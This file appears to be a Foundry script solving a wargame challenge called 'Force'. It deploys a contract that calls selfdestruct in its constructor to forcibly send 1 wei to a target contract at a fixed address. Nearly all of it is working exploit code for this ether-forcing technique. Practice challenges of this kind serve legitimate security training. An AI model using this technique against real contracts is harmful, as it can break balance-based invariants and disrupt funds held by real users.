// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

contract Attacker {
    constructor(address payable _address) payable {
        selfdestruct(_address);
    }
}

contract ForceSolution is Script {
    Force public force = Force(0xA75e60E95696FE62f615dC3fcF53C085b2eFAe75);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attacker{value: 1 wei}(payable(address(force)));
        vm.stopBroadcast();
    }
}
